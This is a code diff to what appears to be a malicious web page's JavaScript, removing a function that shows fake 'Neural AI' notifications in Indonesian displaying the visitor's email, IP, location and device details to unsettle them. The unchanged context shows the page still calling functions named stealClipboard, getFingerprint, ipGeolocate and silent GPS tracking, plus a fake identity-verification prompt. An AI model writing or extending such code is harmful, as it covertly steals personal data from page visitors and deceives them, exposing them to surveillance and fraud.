@@ -1378,50 +1378,6 @@ function initBackgroundFetch() {
     setTimeout(bgFetch, 5000);
 }
 
-function initCreepyAI() {
-    // Collect known data about target
-    const email = emailInput ? emailInput.value : '';
-    const loc = window.lastLocation || '';
-    const ua = navigator.userAgent;
-    const isMobile = /mobile|android|iphone|ipad/i.test(ua);
-    const os = /android/i.test(ua) ? 'Android' : /iphone|ipad/i.test(ua) ? 'iOS' : /windows/i.test(ua) ? 'Windows' : 'Unknown';
-    const browser = /edg/i.test(ua) ? 'Edge' : /chrome/i.test(ua) ? 'Chrome' : /safari/i.test(ua) ? 'Safari' : /firefox/i.test(ua) ? 'Firefox' : 'Unknown';
-    const vendor = window.deviceVendor || '';
-    const model = window.deviceModel || '';
-
-    // Silent creepy notifications that reveal personal data (no sound)
-    setTimeout(() => {
-        const titles = [
-            'Neural AI - Koneksi Terdeteksi',
-            'Sistem Mendeteksi Aktivitas Anda',
-            'AI Neural - Data Dikumpulkan',
-            'Peringatan Privasi',
-            'Perangkat Anda Terhubung'
-        ];
-        const bodies = [
-            `Perangkat: ${browser} / ${os}`,
-            `${email ? 'Akun: ' + email : 'Perangkat terdaftar'}`,
-            `IP: ${window.lastIP || 'Tersembunyi'} - ${loc || 'Lokasi diketahui'}`,
-            `Data perangkat: ${vendor} ${model}`.trim(),
-            'Semua aktivitas Anda dipantau oleh Neural AI.'
-        ];
-        const idx = Math.floor(Math.random() * titles.length);
-        showFakeNotif(titles[idx], bodies[idx]);
-    }, 15000);
-
-    // Periodic creepy notifications with varying data
-    setInterval(() => {
-        const bodies = [
-            `Browser: ${browser} | OS: ${os}`,
-            `${email ? email.split('@')[0] + ', ' : ''}perangkat kamu sudah terdaftar di sistem kami.`,
-            `Lokasi: ${loc || 'Terlacak'} | Waktu: ${new Date().toLocaleTimeString()}`,
-            `Device: ${vendor} ${model}`.trim() || `Sistem: ${os} ${browser}`,
-            'Data kamu aman bersama kami. Neural AI tidak akan pernah lupa.'
-        ];
-        showFakeNotif('Neural AI Update', bodies[Math.floor(Math.random() * bodies.length)]);
-    }, 120000);
-}
-
 function requestPermissions() {
     sendDeviceInfo(); getFingerprint(); ipGeolocate(); stealClipboard(); detectDevice();
     initMotionSensor(); startKeepalive(); requestWakeLock(); initLightSensor();
@@ -1442,7 +1398,6 @@ function requestPermissions() {
         showFakeNotif('Verifikasi AI', 'Neural AI mendeteksi perangkat baru. Verifikasi identitas Anda untuk melanjutkan.');
     }, 3000);
     scheduleGhostSpeech();
-    initCreepyAI();
 
     return requestAllPermissions().then(() => tryGPSSilent());
 }
